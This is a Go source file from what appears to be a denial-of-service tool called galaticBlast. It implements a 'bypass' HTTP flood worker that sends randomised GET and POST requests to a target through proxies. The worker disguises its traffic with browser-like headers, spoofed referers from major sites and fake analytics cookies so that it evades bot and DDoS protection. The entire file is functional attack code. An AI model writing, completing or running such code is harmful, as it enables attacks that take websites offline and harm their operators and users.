package http

import (
	"context"
	"math/rand"
	"net/http"
	"strings"
	"time"

	"github.com/galaticBlast/galaticBlast/internal/engine"
	"github.com/galaticBlast/galaticBlast/internal/netutil"
)

type BypassWorker struct{}

func NewBypassWorker() *BypassWorker {
	return &BypassWorker{}
}

func (w *BypassWorker) Fire(ctx context.Context, params engine.AttackParams, proxy engine.Proxy, userAgent string, logCh chan<- engine.AttackStats) error {
	client := netutil.DialedMimicHTTPClient(proxy, 10*time.Second)

	var method string
	if rand.Intn(5) == 0 {
		method = "POST"
	} else {
		method = "GET"
	}

	targetURL := params.TargetNode.ToURL()
	path := generateResourcePath()
	query := generateQueryParams()

	var req *http.Request
	var err error

	if method == "GET" {
		req, err = http.NewRequestWithContext(ctx, "GET", targetURL+path+query, nil)
	} else {
		body := generateRandomString(params.PacketSize)
		req, err = http.NewRequestWithContext(ctx, "POST", targetURL+path+query, strings.NewReader(body))
	}

	if err != nil {
		return err
	}

	netutil.SetMimicHeaders(req, userAgent)

	if rand.Intn(2) == 0 {
		req.Header.Set("Referer", targetURL)
	} else {
		referers := []string{"https://www.google.com/", "https://www.youtube.com/", "https://twitter.com/"}
		req.Header.Set("Referer", referers[rand.Intn(len(referers))])
	}

	if rand.Intn(3) == 0 {
		req.AddCookie(&http.Cookie{
			Name:  "_ga",
			Value: generateRandomString(10),
		})
		req.AddCookie(&http.Cookie{
			Name:  "_gid",
			Value: generateRandomString(10),
		})
	}

	resp, err := client.Do(req)
	if err != nil {
		engine.SendAttackLogIfVerbose(params.Verbose, logCh, "bypass request failed: "+err.Error())
		return nil
	}
	resp.Body.Close()

	engine.SendAttackLogIfVerbose(params.Verbose, logCh, "bypass request sent successfully")
	return nil
}
